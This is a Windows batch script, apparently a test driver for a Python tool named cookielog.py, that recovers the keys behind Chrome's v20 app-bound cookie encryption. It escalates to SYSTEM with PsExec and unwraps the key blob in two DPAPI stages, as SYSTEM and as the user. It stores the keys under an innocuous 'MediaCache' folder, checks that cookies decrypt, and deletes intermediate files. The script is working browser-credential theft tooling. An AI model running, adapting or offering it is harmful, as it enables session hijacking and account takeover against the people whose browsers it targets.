@echo off
setlocal EnableExtensions
cd /d "%~dp0.."
set "MARK=%~dp0last_py.txt"
set "STAGE1LOG=%ProgramData%\ck_v20_stage1.log"

REM Two entry points, no identity sniffing: PsExec launches this same file with
REM --as-system and the interpreter passed through a file. Parsing USERNAME/SID
REM looked reliable and was not (a SYSTEM child reports the machine account and,
REM in a batch context, whoami can be filtered or localized).
if /i "%~1"=="--as-system" goto :stage1

echo [v20] chrome:
reg query "HKCU\Software\Google\Chrome\BLBeacon" /v version 2>nul | findstr /i version
if exist "%ProgramFiles%\Google\Chrome\Application" for /d %%d in ("%ProgramFiles%\Google\Chrome\Application\1*") do echo [v20] chrome dir: %%~nxd

call :find_py
if not defined PY (
    echo [v20] python.exe not found -- usage: tests\v20.bat ["C:\path\to\python.exe"]
    exit /b 1
)

net session >nul 2>&1
if errorlevel 1 (
    echo [v20] run this from an ADMIN prompt: the app-bound key needs SYSTEM.
    exit /b 1
)

echo [v20] python: %PY%
>"%MARK%" echo %PY%
echo [v20] stage 1 as SYSTEM: machine DPAPI over the APPB blob
"%~dp0..\tools\PsExec64.exe" -accepteula -nobanner -s -w "%CD%" cmd /c ""%~f0" --as-system"
if errorlevel 1 echo [v20] PsExec failed -- stage 1 did not run
if exist "%STAGE1LOG%" (echo [v20] stage 1 log: & type "%STAGE1LOG%")

echo [v20] stage 2 as %USERNAME%: user DPAPI + elevation_service key
"%PY%" cookielog.py --v20-usr
if errorlevel 1 (
    echo [v20] stage 2 FAILED -- keeping *.stage1 for inspection
    exit /b 1
)

echo [v20] keys written:
dir /b "%ProgramData%\MediaCache\mc-*.key" 2>nul

echo [v20] decrypt check:
"%PY%" cookielog.py 2>&1 | findstr /i "cookies"

del /q "%ProgramData%\MediaCache\*.stage1" 2>nul
del /q "%MARK%" 2>nul
exit /b 0

:stage1
set "PY="
if exist "%MARK%" set /p PY=<"%MARK%"
if not defined PY call :find_py
if not defined PY set "PY=python"
echo [v20] system child: interpreter [%PY%]
"%PY%" cookielog.py --v20-sys > "%STAGE1LOG%" 2>&1
echo [v20] stage 1 rc: %errorlevel%
type "%STAGE1LOG%"
dir /b "%ProgramData%\MediaCache" 2>nul
exit /b 0

:find_py
set "PY="
if exist "%LOCALAPPDATA%\Programs\Python\Python314\python.exe" set "PY=%LOCALAPPDATA%\Programs\Python\Python314\python.exe"
if not defined PY for /f "delims=" %%i in ('where python 2^>nul ^| findstr /i /e "python.exe"') do if not defined PY set "PY=%%i"
if not defined PY for /d %%u in ("C:\Users\*") do call :find_py_user "%%~fu"
exit /b 0

:find_py_user
if defined PY exit /b 0
for /d %%v in ("%~1\AppData\Local\Programs\Python\Python3*") do if not defined PY if exist "%%~fv\python.exe" set "PY=%%~fv\python.exe"
exit /b 0
